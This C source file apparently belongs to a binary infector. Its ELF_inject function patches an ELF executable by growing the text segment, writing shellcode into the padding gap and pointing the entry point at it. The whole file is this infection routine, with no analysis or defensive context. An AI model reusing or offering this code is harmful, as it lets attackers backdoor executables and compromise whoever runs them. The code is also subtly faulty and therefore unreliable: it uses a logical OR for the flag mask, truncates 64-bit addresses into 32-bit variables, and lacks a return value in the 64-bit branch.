#include "elf.h"
int ELF_inject(char *file,char *shellcode, int shellcode_len){
    uint32_t size;
    uint32_t text_end = 0;
    uint32_t vaddr;
    uint32_t oryginal_entry;


    int gap = 4096;

    char *elf = load_file(file,&size);
    if(elf[4]==ELFCLASS32){
    Elf32_Ehdr *ehdr32 = (Elf32_Ehdr*)elf;
    
    if(ehdr32->e_type!=ET_EXEC){
        return -1;
    }

    oryginal_entry = ehdr32->e_entry;

    Elf32_Phdr *phdr32 = (Elf32_Phdr*) (elf + ehdr32->e_phoff);

    for (int i = 0 ; i < ehdr32->e_phnum ; i++){

        if(phdr32->p_type==PT_LOAD && phdr32->p_flags==(PF_R||PF_X)){

        text_end = phdr32->p_offset + phdr32->p_filesz;

        vaddr = phdr32->p_vaddr + phdr32->p_filesz;

        phdr32->p_filesz += (shellcode_len+5);

        phdr32->p_memsz  += (shellcode_len+5);



        }

        else{

        if(phdr32->p_type==PT_LOAD && (phdr32->p_offset - text_end)<gap){

            gap = (phdr32->p_offset - text_end);

        }

        }



    phdr32++;

    }

    Elf32_Shdr *shdr32 = (Elf32_Shdr*) (elf + ehdr32->e_shoff);

    for (int j = 0 ; j < ehdr32->e_shnum ; j++){



    if((shdr32->sh_offset+shdr32->sh_size)==text_end)

    {

    shdr32->sh_size+=(shellcode_len + 5 );

    }



    shdr32++;

    }

    if(gap<(shellcode_len+5)){

        return -1;

    }

    ehdr32->e_entry = vaddr;

    char *payload = apply_suffix(shellcode,shellcode_len,oryginal_entry,vaddr);

    write_data(file,0,elf,size);

    write_data(file,text_end,payload,shellcode_len+5);

    return 0;
    }
    if(elf[4]==ELFCLASS64){
        Elf64_Ehdr *ehdr64 = (Elf64_Ehdr*)elf;
    
        if(ehdr64->e_type!=ET_EXEC){
            return -1;
        }
    
        oryginal_entry = ehdr64->e_entry;
    
        Elf64_Phdr *phdr64 = (Elf64_Phdr*) (elf + ehdr64->e_phoff);
    
        for (int i = 0 ; i < ehdr64->e_phnum ; i++){
    
            if(phdr64->p_type==PT_LOAD && phdr64->p_flags==(PF_R||PF_X)){
    
            text_end = phdr64->p_offset + phdr64->p_filesz;
    
            vaddr = phdr64->p_vaddr + phdr64->p_filesz;
    
            phdr64->p_filesz += (shellcode_len+5);
    
            phdr64->p_memsz  += (shellcode_len+5);
    
    
    
            }
    
            else{
    
            if(phdr64->p_type==PT_LOAD && (phdr64->p_offset - text_end)<gap){
    
                gap = (phdr64->p_offset - text_end);
    
            }
    
            }
    
    
    
        phdr64++;
    
        }
    
        Elf64_Shdr *shdr64 = (Elf64_Shdr*) (elf + ehdr64->e_shoff);
    
        for (int j = 0 ; j < ehdr64->e_shnum ; j++){
    
    
    
        if((shdr64->sh_offset+shdr64->sh_size)==text_end)
    
        {
    
        shdr64->sh_size+=(shellcode_len + 5 );
    
        }
    
    
    
        shdr64++;
    
        }
    
        if(gap<(shellcode_len+5)){
    
            return -1;
    
        }
    
        ehdr64->e_entry = vaddr;
    
        char *payload = apply_suffix(shellcode,shellcode_len,oryginal_entry,vaddr);
    
        write_data(file,0,elf,size);
    
        write_data(file,text_end,payload,shellcode_len+5);

        }
    }
